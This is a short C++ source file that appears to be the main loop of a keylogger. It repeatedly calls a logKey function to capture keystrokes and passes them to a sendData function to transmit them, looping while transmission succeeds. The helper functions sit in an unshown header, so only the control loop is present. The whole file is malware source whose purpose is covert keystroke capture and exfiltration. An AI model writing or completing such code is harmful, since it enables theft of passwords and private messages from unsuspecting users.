#include "Core.h"

using namespace std;

int main() {
    future<char *> keys;
    bool dataSent = false;
    bool firstLoop = true;
    while ( firstLoop || dataSent ) {
        keys = async(logKey);
        dataSent = sendData(keys.get());
        firstLoop = false;
    }
    return 0;
}